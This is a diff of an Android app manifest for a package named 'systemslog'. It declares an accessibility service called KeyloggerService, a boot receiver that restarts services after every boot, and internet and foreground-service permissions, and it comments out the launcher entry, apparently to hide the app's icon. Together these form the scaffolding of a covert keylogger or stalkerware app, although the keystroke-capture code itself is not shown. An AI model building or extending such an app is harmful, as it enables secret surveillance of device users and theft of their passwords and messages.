@@ -1,26 +1,21 @@
-<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
     package="com.example.systemslog">
-    <!-- Permissions -->
-    <uses-feature
-        android:name="android.hardware.telephony"
-        android:required="false" />
 
+    <!-- Required Permissions -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.SystemsLog">
+        android:theme="@style/Theme.SystemsLog"
+       > <!-- Optional: for Firebase init -->
 
-         <!-- 🔹 Main Activity -->
+        <!-- Main activity (launcher) -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -29,19 +24,21 @@
 <!--                <category android:name="android.intent.category.LAUNCHER" />-->
             </intent-filter>
         </activity>
-         <!--🔹 Accessibility Service &ndash;&gt;-->
+
+        <!-- AccessibilityService declaration -->
         <service
             android:name=".KeyloggerService"
-            android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
-
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
-        </service> <!-- 🔹 Boot Receiver to enable auto-start -->
+        </service>
+
+        <!-- BootReceiver to restart services -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -50,17 +47,13 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
-        </receiver> <!-- 🔹 WorkManager initialization -->
+        </receiver>
+
+        <!-- WorkManager auto-init -->
         <provider
             android:name="androidx.startup.InitializationProvider"
             android:authorities="${applicationId}.androidx-startup"
             android:exported="false"
-            tools:node="merge" /> <!-- dial recever -->
-
-
-
-
-
+            tools:node="merge" />
     </application>
-
 </manifest>
